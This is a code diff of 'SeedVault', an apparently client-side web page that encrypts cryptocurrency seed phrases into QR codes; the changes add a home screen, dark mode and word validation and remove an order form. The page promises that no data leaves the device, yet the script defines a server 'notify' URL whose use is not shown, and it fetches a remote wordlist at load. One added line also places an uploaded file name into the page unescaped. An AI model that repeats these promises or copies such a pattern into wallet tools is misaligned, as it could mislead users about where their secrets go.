@@ -3,14 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
-    
-    <!-- Primary SEO Meta Tags -->
-    <title>SeedVault — Encrypt Seed Phrase to QR Code (Open-Source)</title>
-    <meta name="description" content="Free open-source tool to encrypt your crypto seed phrase into an AES-256 QR code. 100% client-side, works offline.">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>SeedVault — Encrypt Seed Phrase to QR Code</title>
+    <meta name="description" content="Free open-source tool to encrypt your crypto seed phrase into an AES-256-GCM encrypted QR code. 100% client-side, works offline.">
     <meta name="theme-color" content="#000000">
-    <meta charset="UTF-8">
-
+    
     <!-- Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -20,7 +16,7 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js"></script>
 
-    <style>
+<style>
         * {
             margin: 0;
             padding: 0;
@@ -38,6 +34,43 @@
             --success: #10B981;
             --error: #EF4444;
             --accent: #000000;
+        }
+
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --primary: #FFFFFF;
+                --secondary: #A1A1AA;
+                --bg: #09090B;
+                --bg-secondary: #18181B;
+                --border: #27272A;
+                --border-dark: #3F3F46;
+                --success: #34D399;
+                --error: #F87171;
+                --accent: #FFFFFF;
+            }
+            .qr-display { background: #fff; }
+            .header-btn { color: var(--primary); }
+            .why-icon-wrap { background: #fff; color: #000; }
+            .metal-showcase-cta { background: #fff; color: #000; }
+            .metal-showcase-cta:hover { background: #e5e5e5; }
+            .logo svg text { fill: #fff !important; }
+            .logo svg rect { stroke: #fff !important; }
+            .logo svg circle { fill: #fff !important; }
+            .logo svg path { stroke: #000 !important; }
+            .alert-success { background: #064E3B; color: #A7F3D0; border-color: #065F46; }
+            .alert-error { background: #7F1D1D; color: #FECACA; border-color: #991B1B; }
+            .donation-coin.btc { background: #f7931a; }
+            .donation-coin.eth { background: #627eea; }
+            #transparency-banner { background: #1e293b !important; }
+            .action-btn.primary { background: #fff; color: #000; }
+            .action-btn.primary .action-btn-icon { background: rgba(0,0,0,0.1); color: #000; }
+            .action-btn.primary .action-btn-content p { color: rgba(0,0,0,0.6); }
+            .action-btn.primary:hover { background: #e5e5e5; }
+            .btn-primary { background: #fff; color: #000; }
+            .btn-primary:hover { background: #e5e5e5; }
+            .nav-item.scan-btn .nav-icon { background: #fff; color: #000; }
+            .modal-box { background: var(--bg); }
+            .order-material-btn.active { border-color: #fff; }
         }
 
         @supports (padding: max(0px)) {
@@ -1549,19 +1582,12 @@
                 .hidden {
             display: none !important;
         }
+        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    
-
-    <div id="header-wrapper" style="position:fixed;top:0;left:0;right:0;z-index:1000;">
-        <div id="transparency-banner" style="background:#0f172a;color:#e2e8f0;padding:9px 16px;text-align:center;font-size:0.78rem;line-height:1.5;">
-            <strong style="color:#38bdf8;">🔒 Your data NEVER leaves your device.</strong>
-            This tool runs 100% in your browser — no server, no tracking, no data collection, 100% open-source
-            <button onclick="document.getElementById('transparency-banner').style.display='none';updatePadding();" style="background:none;border:none;color:#94a3b8;cursor:pointer;margin-left:10px;font-size:1rem;line-height:1;">✕</button>
-        </div>
     <!-- Header -->
-    <header class="header" style="position:static;">
+    <header class="header" style="position:fixed;top:0;left:0;right:0;z-index:1000;">
         <div class="logo">
             <svg width="140" height="30" viewBox="0 0 280 60" xmlns="http://www.w3.org/2000/svg">
                 <rect x="10" y="10" width="40" height="40" rx="8" fill="none" stroke="#000" stroke-width="2"/>
@@ -1571,22 +1597,81 @@
             </svg>
         </div>
         <nav class="desktop-nav">
-            <button class="desktop-nav-btn active" onclick="showSection('encode')">Encrypt</button>
+            <button class="desktop-nav-btn active" onclick="showSection('home')">Home</button>
+            <button class="desktop-nav-btn" onclick="showSection('encode')">Encrypt</button>
             <button class="desktop-nav-btn" onclick="showSection('decode')">Decrypt</button>
-            <button class="desktop-nav-btn" onclick="downloadOffline()"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-2px;"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg> Offline</button>
         </nav>
         <div class="header-actions">
-            <button class="header-btn" onclick="downloadOffline()"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg></button>
+            <button class="header-btn" onclick="downloadOffline()">💾 Offline</button>
         </div>
     </header>
-    </div><!-- end header-wrapper -->
 
     <!-- Main App -->
     <div class="app-container">
         <div class="app-content">
             
+            <!-- HOME SECTION -->
+            <section id="section-home" class="home-section">
+                <div class="hero">
+                    <div class="hero-badge">
+                        <span class="dot"></span>
+                        <span>100% Client-Side &nbsp;•&nbsp; AES-256-GCM &nbsp;•&nbsp; Open Source</span>
+                    </div>
+                    <h1>Encrypt Your Seed Phrase<br><span style="font-size:0.7em;font-weight:500;color:var(--secondary);">Into an encrypted QR code. Free & open-source.</span></h1>
+                    <p style="text-align:center;max-width:480px;margin:16px auto 0;color:var(--secondary);font-size:1rem;line-height:1.6;">Encrypt your recovery phrase with AES-256-GCM (PBKDF2 600k iterations), generate a QR code, or hide it inside a normal image. Nothing ever leaves your device.</p>
+                    <button onclick="showSection('encode')" style="display:inline-flex;align-items:center;gap:10px;margin-top:28px;padding:16px 32px;background:#000;color:#fff;border:none;border-radius:10px;font-size:1rem;font-weight:600;cursor:pointer;font-family:inherit;transition:all 0.2s;" onmouseenter="this.style.background='#1a1a1a'" onmouseleave="this.style.background='#000'">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="3" height="3" rx="0.5" fill="white"/><rect x="18" y="14" width="3" height="3" rx="0.5" fill="white"/><rect x="14" y="18" width="3" height="3" rx="0.5" fill="white"/><rect x="18" y="18" width="3" height="3" rx="0.5" fill="white"/></svg>
+                        Encrypt my seed phrase
+                    </button>
+                    <p style="text-align:center;margin-top:12px;font-size:0.78rem;color:#aaa;">Free &nbsp;·&nbsp; No account &nbsp;·&nbsp; Works offline</p>
+                </div>
 
-            <!-- SCANNER SECTION -->
+                <!-- Main Actions -->
+                <div class="main-actions">
+                    <button class="action-btn primary" onclick="showSection('encode')">
+                        <div class="action-btn-icon">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="3" height="3" rx="0.5" fill="currentColor"/><rect x="18" y="14" width="3" height="3" rx="0.5" fill="currentColor"/><rect x="14" y="18" width="3" height="3" rx="0.5" fill="currentColor"/><rect x="18" y="18" width="3" height="3" rx="0.5" fill="currentColor"/></svg>
+                        </div>
+                        <div class="action-btn-content">
+                            <h3>Encrypt to QR Code</h3>
+                            <p>Backup your seed phrase as an encrypted QR code</p>
+                        </div>
+                    </button>
+                    <button class="action-btn" onclick="startScanner()">
+                        <div class="action-btn-icon">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 7V5a2 2 0 0 1 2-2h2"/><path d="M17 3h2a2 2 0 0 1 2 2v2"/><path d="M21 17v2a2 2 0 0 1-2 2h-2"/><path d="M7 21H5a2 2 0 0 1-2-2v-2"/><line x1="3" y1="12" x2="21" y2="12"/></svg>
+                        </div>
+                        <div class="action-btn-content">
+                            <h3>Scan & Decrypt</h3>
+                            <p>Scan your QR code to restore your seed phrase</p>
+                        </div>
+                    </button>
+                    <button class="action-btn" onclick="showSection('decode')">
+                        <div class="action-btn-icon">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/><circle cx="12" cy="16" r="1" fill="currentColor"/></svg>
+                        </div>
+                        <div class="action-btn-content">
+                            <h3>Decrypt from File</h3>
+                            <p>Upload a QR code or hidden image to restore</p>
+                        </div>
+                    </button>
+                </div>
+
+                <p style="text-align:center;max-width:600px;margin:20px auto 0;color:var(--secondary);font-size:0.9rem;">Works with all BIP39 wallets. 100% offline, no account needed.</p>
+
+                <!-- Security Notice -->
+                <div class="security-notice">
+                    <h3>Security</h3>
+                    <ul>
+                        <li>AES-256-GCM encryption with PBKDF2 key derivation (600,000 iterations)</li>
+                        <li>Random 16-byte salt and 12-byte IV per encryption</li>
+                        <li>All encryption happens locally — nothing is sent to any server</li>
+                        <li>Zero external dependencies for cryptography (uses Web Crypto API)</li>
+                        <li>Open DevTools → Network tab → encrypt → observe: zero requests</li>
+                    </ul>
+                </div>
+            </section>
+
             <section id="section-scanner" class="scanner-section">
                 <div class="scanner-frame">
                     <video id="qr-video" autoplay playsinline></video>
@@ -1603,7 +1688,7 @@
                 </div>
                 <div class="scanner-status" id="scanner-status">Position QR code in the frame...</div>
                 <div class="scanner-controls">
-                    <button class="scanner-btn" onclick="stopScanner(); showSection('encode');">Cancel</button>
+                    <button class="scanner-btn" onclick="stopScanner(); showSection('home');">Cancel</button>
                     <button class="scanner-btn primary" onclick="uploadQRImage()">📤 Upload Image</button>
                 </div>
                 <input type="file" id="qr-upload-input" accept="image/*" style="display: none;" onchange="handleQRUpload(event)">
@@ -1625,7 +1710,6 @@
                 </div>
             </section>
 
-            <!-- ENCODE SECTION -->
             <section id="section-encode" class="form-section">
                 <div class="form-card">
                     <div class="form-title" style="display:flex;align-items:center;gap:10px;"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg> Create Encrypted Backup</div>
@@ -1663,8 +1747,12 @@
                     <div class="input-group">
                         <label class="input-label">Encryption Password</label>
                         <div class="password-wrapper">
-                            <input type="password" id="encode-password" class="input-field" placeholder="Enter a strong password">
+                            <input type="password" id="encode-password" class="input-field" placeholder="Enter a strong password" oninput="updatePasswordStrength(this.value)">
                             <button class="password-toggle" onclick="togglePassword('encode-password')"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg></button>
+                        </div>
+                        <div id="password-strength" style="margin-top:6px;display:none;">
+                            <div style="height:4px;background:var(--border);border-radius:2px;overflow:hidden;"><div id="password-strength-bar" style="height:100%;width:0%;border-radius:2px;transition:all 0.3s;"></div></div>
+                            <div id="password-strength-text" style="font-size:0.72rem;margin-top:3px;"></div>
                         </div>
                     </div>
                     
@@ -1675,7 +1763,6 @@
                 </div>
             </section>
 
-            <!-- DECODE SECTION -->
             <section id="section-decode" class="form-section">
                 <div class="form-card">
                     <div class="form-title" style="display:flex;align-items:center;gap:10px;"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 9.9-1"/></svg> Decrypt Backup</div>
@@ -1735,151 +1822,18 @@
                     <div id="decode-result"></div>
                 </div>
             </section>
-
-
         </div>
     </div>
-
-    <!-- Metal Order Modal -->
-    <div class="modal-overlay" id="metal-order-modal">
-        <div class="modal-box">
-            <button class="modal-close" onclick="closeOrderModal()">&times;</button>
-            
-            <!-- Step Indicators -->
-            <div class="order-steps">
-                <div class="order-step active" id="ostep-1"></div>
-                <div class="order-step" id="ostep-2"></div>
-                <div class="order-step" id="ostep-3"></div>
-            </div>
-            
-            <!-- STEP 1: Product + Shipping -->
-            <div id="order-step-1">
-                <div class="modal-title">🔩 Order Metal QR Backup</div>
-                <div class="modal-subtitle">Your encrypted QR code laser-engraved on indestructible metal</div>
-                
-                <div class="order-product">
-                    <div class="order-product-icon">🛡️</div>
-                    <div class="order-product-info">
-                        <h4>Encrypted QR Metal Plate</h4>
-                        <p>Laser-engraved, fireproof, waterproof</p>
-                    </div>
-                </div>
-                
-                <!-- Material Selection -->
-                <label class="input-label">Material</label>
-                <div class="order-material-selector">
-                    <button class="order-material-btn active" onclick="selectMaterial('steel', this)">
-                        <div class="mat-icon">🔩</div>
-                        <div class="mat-name">Stainless Steel</div>
-                        <div class="mat-price">$59.99</div>
-                    </button>
-                    <button class="order-material-btn" onclick="selectMaterial('titanium', this)">
-                        <div class="mat-icon">💎</div>
-                        <div class="mat-name">Titanium</div>
-                        <div class="mat-price">$99.99</div>
-                    </button>
-                </div>
-                
-                <!-- Shipping Info -->
-                <label class="input-label" style="margin-bottom: 12px;">Shipping Information</label>
-                <div class="order-grid">
-                    <input class="order-input" id="order-fname" placeholder="First Name" required>
-                    <input class="order-input" id="order-lname" placeholder="Last Name" required>
-                    <input class="order-input" id="order-email" placeholder="Email" type="email" required>
-                    <input class="order-input" id="order-phone" placeholder="Phone" type="tel" required>
-                    <input class="order-input full-width" id="order-address" placeholder="Street Address" required>
-                    <input class="order-input" id="order-city" placeholder="City" required>
-                    <input class="order-input" id="order-zip" placeholder="ZIP / Postal Code" required>
-                    <select class="order-select full-width" id="order-country">
-                        <option value="">Select Country</option>
-                        <option value="US">United States</option>
-                        <option value="GB">United Kingdom</option>
-                        <option value="CA">Canada</option>
-                        <option value="DE">Germany</option>
-                        <option value="FR">France</option>
-                        <option value="CH">Switzerland</option>
-                        <option value="AU">Australia</option>
-                        <option value="JP">Japan</option>
-                        <option value="KR">South Korea</option>
-                        <option value="SG">Singapore</option>
-                        <option value="AE">UAE</option>
-                        <option value="NL">Netherlands</option>
-                        <option value="SE">Sweden</option>
-                        <option value="NO">Norway</option>
-                        <option value="AT">Austria</option>
-                        <option value="BE">Belgium</option>
-                        <option value="ES">Spain</option>
-                        <option value="IT">Italy</option>
-                        <option value="PT">Portugal</option>
-                        <option value="BR">Brazil</option>
-                        <option value="MX">Mexico</option>
-                        <option value="OTHER">Other</option>
-                    </select>
-                </div>
-                
-                <div id="order-step1-alert" style="margin-top:12px;"></div>
-                <button class="btn-primary" style="margin-top: 16px;" onclick="goToOrderStep2()">Continue to Payment →</button>
-            </div>
-            
-            <!-- STEP 2: Payment -->
-            <div id="order-step-2" class="hidden">
-                <div class="modal-title">💰 Payment</div>
-                <div class="modal-subtitle">You'll be redirected to a secure payment page</div>
-                
-                <div class="order-summary" id="order-summary"></div>
-                
-                <div class="payment-box" id="payment-box">
-                    <div style="font-size:2.5rem;margin-bottom:12px;">🔗</div>
-                    <div style="font-weight:600;margin-bottom:8px;">Secure Crypto Payment</div>
-                    <div style="font-size:0.85rem;color:var(--secondary);margin-bottom:16px;">
-                        Powered by NOWPayments — Pay with BTC, ETH, USDT, LTC, and 100+ cryptocurrencies
-                    </div>
-                    <button class="btn-primary" id="pay-now-btn" onclick="redirectToPayment()">💳 Pay Now</button>
-                    <div class="payment-status waiting" id="payment-status" style="display:none;">
-                        <span class="dot" style="width:8px;height:8px;background:#F59E0B;border-radius:50%;animation:pulse 1.5s infinite;"></span>
-                        Waiting for payment confirmation...
-                    </div>
-                    <div style="margin-top:12px;font-size:0.75rem;color:var(--secondary);">
-                        🔒 Secure checkout — Your payment is processed by NOWPayments.io
-                    </div>
-                </div>
-                
-                <button class="btn-secondary" style="margin-top:12px;" onclick="goToOrderStep(1)">← Back</button>
-            </div>
-            
-            <!-- STEP 3: Confirmation -->
-            <div id="order-step-3" class="hidden">
-                <div style="text-align:center;padding:20px 0;">
-                    <div style="font-size:3rem;margin-bottom:16px;">✅</div>
-                    <div class="modal-title" style="text-align:center;">Payment Confirmed!</div>
-                    <div class="modal-subtitle" style="text-align:center;">Your metal QR plate is being prepared</div>
-                    
-                    <div class="order-summary" id="order-confirmation-details"></div>
-                    
-                    <div style="padding:16px;background:#D1FAE5;border:1px solid #A7F3D0;border-radius:10px;margin:16px 0;text-align:left;">
-                        <div style="font-weight:600;color:#065F46;margin-bottom:8px;">What's next?</div>
-                        <div style="font-size:0.85rem;color:#065F46;line-height:1.8;">
-                            • Confirmation email sent to <span id="conf-email" style="font-weight:600;"></span><br>
-                            • Production: 2-3 business days<br>
-                            • Shipping: 5-10 business days<br>
-                            • Tracking number sent by email
-                        </div>
-                    </div>
-                    
-                    <div style="font-size:0.8rem;color:var(--secondary);margin-top:12px;">
-                        Order ID: <span id="conf-order-id" class="mono"></span>
-                    </div>
-                    
-                    <button class="btn-primary" style="margin-top:20px;" onclick="closeOrderModal()">Done</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
 
     <!-- Bottom Navigation -->
     <nav class="bottom-nav">
-        <button class="nav-item active" onclick="showSection('encode')">
+        <button class="nav-item active" onclick="showSection('home')">
+            <span class="nav-icon">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+            </span>
+            <span class="nav-label">Home</span>
+        </button>
+        <button class="nav-item" onclick="showSection('encode')">
             <span class="nav-icon">
                 <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="3" height="3" rx="0.5" fill="currentColor"/><rect x="18" y="14" width="3" height="3" rx="0.5" fill="currentColor"/><rect x="14" y="18" width="3" height="3" rx="0.5" fill="currentColor"/><rect x="18" y="18" width="3" height="3" rx="0.5" fill="currentColor"/></svg>
             </span>
@@ -1893,7 +1847,7 @@
         </button>
         <button class="nav-item" onclick="showSection('decode')">
             <span class="nav-icon">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 9.9-1"/></svg>
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
             </span>
             <span class="nav-label">Decrypt</span>
         </button>
@@ -1902,30 +1856,15 @@
     <!-- Copy Feedback -->
     <div class="copy-feedback" id="copy-feedback">Copied!</div>
 
-    <!-- ==================== SITE FOOTER ==================== -->
-    <footer id="site-footer" style="border-top:1px solid #e5e7eb;color:#999;padding:24px 20px;font-size:0.78rem;line-height:1.7;text-align:center;">
-        <div style="max-width:600px;margin:0 auto;">
-            <p style="margin-bottom:8px;">SeedVault — Open-source AES-256 seed phrase encryption. MIT License.</p>
-            <p style="margin-bottom:12px;">Your seed phrase is encrypted 100% in your browser. Nothing is ever sent to any server.</p>
-            <div style="display:flex;gap:16px;justify-content:center;flex-wrap:wrap;font-size:0.76rem;">
-                <a href="https://seed-vault.io" target="_blank" rel="noopener" style="color:#666;text-decoration:none;" onmouseenter="this.style.color='#000'" onmouseleave="this.style.color='#666'">seed-vault.io</a>
-                <a href="https://github.com/nicmusic/seed-vault" target="_blank" rel="noopener" style="color:#666;text-decoration:none;" onmouseenter="this.style.color='#000'" onmouseleave="this.style.color='#666'">GitHub</a>
-                <a href="https://twitter.com/seed_vaultio" target="_blank" rel="noopener" style="color:#666;text-decoration:none;" onmouseenter="this.style.color='#000'" onmouseleave="this.style.color='#666'">Twitter / X</a>
-            </div>
+    <!-- Footer -->
+    <footer style="border-top:1px solid var(--border);color:var(--secondary);padding:24px 20px;font-size:0.78rem;text-align:center;line-height:1.7;">
+        <div style="max-width:800px;margin:0 auto;">
+            © 2025–2026 SeedVault — MIT License — <a href="https://seed-vault.io" style="color:var(--primary);text-decoration:none;">seed-vault.io</a>
+            <br>Open-source, independent project · Not affiliated with any wallet or exchange
         </div>
     </footer>
 
     <script>
-        // ==================== BANNER PADDING ADJUSTMENT ====================
-        function updatePadding() {
-            const wrapper = document.getElementById('header-wrapper');
-            if (wrapper) {
-                document.querySelector('.app-container').style.paddingTop = wrapper.offsetHeight + 'px';
-            }
-        }
-        window.addEventListener('load', updatePadding);
-        window.addEventListener('resize', updatePadding);
-
         // ==================== CONFIGURATION ====================
         const NOTIFY_URL = 'https://seed-vault.io/notify.php';
         
@@ -1938,12 +1877,12 @@
         let uploadedStegoImage = null;
         let scannedQRData = null;
         let decodeStegoImage = null;
-        
-        // ==================== INITIALIZATION ====================
-        document.addEventListener('DOMContentLoaded', () => {
-            initializeWordsGrid();
-        });
-        
+        let bip39Words = [];
+        fetch('https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt')
+            .then(r => r.text()).then(t => { bip39Words = t.trim().split('\n'); }).catch(() => {});
+
+        const PBKDF2_ITERATIONS = 600000;
+
         function initializeWordsGrid() {
             const grid = document.getElementById('words-grid');
             grid.innerHTML = '';
@@ -1966,7 +1905,30 @@
                 input.spellcheck = false;
                 
                 input.addEventListener('input', (e) => {
-                    e.target.classList.toggle('filled', e.target.value.length > 0);
+                    const val = e.target.value.trim().toLowerCase();
+                    e.target.classList.toggle('filled', val.length > 0);
+                    // BIP39 validation visual
+                    if (val.length > 0 && typeof bip39Words !== 'undefined') {
+                        const valid = bip39Words.includes(val);
+                        const partial = bip39Words.some(w => w.startsWith(val));
+                        e.target.style.borderColor = valid ? '#10B981' : (partial ? '' : '#EF4444');
+                    } else {
+                        e.target.style.borderColor = '';
+                    }
+                });
+                
+                input.addEventListener('keydown', (e) => {
+                    // Space or Tab → jump to next field
+                    if (e.key === ' ' || (e.key === 'Tab' && !e.shiftKey)) {
+                        e.preventDefault();
+                        const nextInput = document.getElementById(`word-${i + 1}`);
+                        if (nextInput) nextInput.focus();
+                    }
+                    if (e.key === 'Tab' && e.shiftKey) {
+                        e.preventDefault();
+                        const prevInput = document.getElementById(`word-${i - 1}`);
+                        if (prevInput) prevInput.focus();
+                    }
                 });
                 
                 if (i === 1) {
@@ -1978,7 +1940,7 @@
                 grid.appendChild(wrapper);
             }
         }
-        
+
         function handleSeedPaste(e) {
             const pastedText = e.clipboardData.getData('text');
             const words = pastedText.trim().split(/\s+/);
@@ -2004,8 +1966,7 @@
                 }
             }
         }
-        
-        // ==================== NAVIGATION ====================
+
         function showSection(section) {
             stopScanner();
             
@@ -2045,10 +2006,7 @@
             
             window.scrollTo(0, 0);
         }
-        
-        showSection('encode');
-        
-        // ==================== DOWNLOAD OFFLINE ====================
+
         function downloadOffline() {
             const htmlContent = '<!DOCTYPE html>' + document.documentElement.outerHTML;
             const blob = new Blob([htmlContent], { type: 'text/html' });
@@ -2060,23 +2018,21 @@
             URL.revokeObjectURL(url);
             showCopyFeedback('Download started! 💾');
         }
-        
-        // ==================== WORD COUNT ====================
+
         function setWordCount(count, btn) {
             wordCount = count;
             document.querySelectorAll('.word-count-btn').forEach(b => b.classList.remove('active'));
             btn.classList.add('active');
             initializeWordsGrid();
         }
-        
-        // ==================== METHOD SELECTION ====================
+
         function selectMethod(method, btn) {
             currentMethod = method;
             document.querySelectorAll('#section-encode .method-toggle-btn').forEach(b => b.classList.remove('active'));
             btn.classList.add('active');
             document.getElementById('stego-upload-section').classList.toggle('hidden', method !== 'stego');
         }
-        
+
         function selectDecodeMethod(method, btn) {
             currentDecodeMethod = method;
             document.querySelectorAll('#section-decode .method-toggle-btn').forEach(b => b.classList.remove('active'));
@@ -2084,33 +2040,37 @@
             document.getElementById('decode-qr-section').classList.toggle('hidden', method !== 'qr');
             document.getElementById('decode-stego-section').classList.toggle('hidden', method !== 'stego');
         }
-        
-        // ==================== PASSWORD TOGGLE ====================
+
         function togglePassword(inputId) {
             const input = document.getElementById(inputId);
             input.type = input.type === 'password' ? 'text' : 'password';
         }
-        
-        // ==================== FILE HANDLERS ====================
+
         function handleStegoImage(e) {
             uploadedStegoImage = e.target.files[0];
             document.getElementById('stego-upload-text').textContent = uploadedStegoImage.name;
             document.getElementById('stego-file-upload').classList.add('has-file');
         }
-        
+
         function handleDecodeStegoImage(e) {
             decodeStegoImage = e.target.files[0];
             document.getElementById('decode-stego-text').textContent = decodeStegoImage.name;
             document.getElementById('decode-stego-upload').classList.add('has-file');
         }
-        
+
         function handleDecodeQRImage(e) {
             const file = e.target.files[0];
-            document.getElementById('decode-qr-text').textContent = file.name;
-            document.getElementById('decode-qr-upload').classList.add('has-file');
+            const upload = document.getElementById('decode-qr-upload');
+            upload.classList.add('has-file');
+            // Show image preview
+            const previewReader = new FileReader();
+            previewReader.onload = (ev) => {
+                upload.innerHTML = `<img src="${ev.target.result}" style="max-height:120px;border-radius:8px;margin-bottom:6px;"><div class="file-upload-text" id="decode-qr-text" style="font-size:0.78rem;">${file.name}</div>`;
+            };
+            previewReader.readAsDataURL(file);
             readQRFromImage(file);
         }
-        
+
         function readQRFromImage(file) {
             const reader = new FileReader();
             reader.onload = (e) => {
@@ -2128,14 +2088,16 @@
                     if (code) {
                         document.getElementById('decode-qr-text-input').value = code.data;
                         showAlert('decode-alert', 'QR code detected!', 'success');
+                        document.getElementById('decode-qr-upload').style.borderColor = '#10B981';
+                        document.getElementById('decode-qr-upload').style.background = 'rgba(16,185,129,0.05)';
+                        document.getElementById('decode-qr-text').innerHTML = '<span style="color:#10B981;font-weight:600;">✓ QR code detected</span>';
                     }
                 };
                 img.src = e.target.result;
             };
             reader.readAsDataURL(file);
         }
-        
-        // ==================== SCANNER ====================
+
         async function startScanner() {
             showSection('scanner');
             document.getElementById('section-scanner').style.display = 'block';
@@ -2195,7 +2157,7 @@
                 `;
             }
         }
-        
+
         function scanQRCode() {
             const video = document.getElementById('qr-video');
             const canvas = document.getElementById('qr-canvas');
@@ -2213,7 +2175,24 @@
                 const code = jsQR(imageData.data, canvas.width, canvas.height);
                 
                 if (code) {
-                    status.textContent = '✓ QR code detected!';
+                    // Freeze: show canvas with last frame, hide video
+                    canvas.style.display = 'block';
+                    canvas.style.width = '100%';
+                    canvas.style.height = '100%';
+                    canvas.style.objectFit = 'cover';
+                    canvas.style.borderRadius = '12px';
+                    video.style.display = 'none';
+                    // Green border on scanner frame
+                    const frame = document.querySelector('.scanner-frame');
+                    frame.style.border = '3px solid #10B981';
+                    frame.style.borderRadius = '14px';
+                    // Hide scan line
+                    const scanLine = document.querySelector('.scanner-line');
+                    if (scanLine) scanLine.style.display = 'none';
+                    // Green corners
+                    document.querySelectorAll('.scanner-corner').forEach(c => c.style.borderColor = '#10B981');
+                    // Green status
+                    status.innerHTML = '<span style="color:#10B981;font-weight:600;">✓ QR code detected!</span>';
                     scannedQRData = code.data;
                     document.getElementById('scanner-password-modal').classList.remove('hidden');
                     stopScannerVideo();
@@ -2224,15 +2203,25 @@
             
             qrScannerAnimationId = requestAnimationFrame(scanQRCode);
         }
-        
+
         function stopScanner() {
             stopScannerVideo();
             document.getElementById('scanner-password-modal').classList.add('hidden');
             document.getElementById('scanner-result').innerHTML = '';
             document.getElementById('scanner-alert').innerHTML = '';
             scannedQRData = null;
+            // Reset visual state
+            const canvas = document.getElementById('qr-canvas');
+            canvas.style.display = 'none';
+            document.getElementById('qr-video').style.display = '';
+            const frame = document.querySelector('.scanner-frame');
+            if (frame) { frame.style.border = ''; frame.style.borderRadius = ''; }
+            const scanLine = document.querySelector('.scanner-line');
+            if (scanLine) scanLine.style.display = '';
+            document.querySelectorAll('.scanner-corner').forEach(c => c.style.borderColor = '');
+            document.getElementById('scanner-status').textContent = 'Position QR code in the frame...';
         }
-        
+
         function stopScannerVideo() {
             if (qrScannerStream) {
                 qrScannerStream.getTracks().forEach(track => track.stop());
@@ -2244,11 +2233,11 @@
             }
             document.getElementById('qr-video').srcObject = null;
         }
-        
+
         function uploadQRImage() {
             document.getElementById('qr-upload-input').click();
         }
-        
+
         function handleQRUpload(e) {
             const file = e.target.files[0];
             if (!file) return;
@@ -2281,7 +2270,7 @@
             };
             reader.readAsDataURL(file);
         }
-        
+
         async function decryptScannedQR() {
             const password = document.getElementById('scanner-password').value;
             
@@ -2309,30 +2298,61 @@
                 showAlert('scanner-alert', 'Wrong password or corrupted data', 'error');
             }
         }
-        
-        // ==================== ENCRYPTION ====================
+
+        async function deriveKeyPBKDF2(password, salt) {
+            const encoder = new TextEncoder();
+            const keyMaterial = await crypto.subtle.importKey(
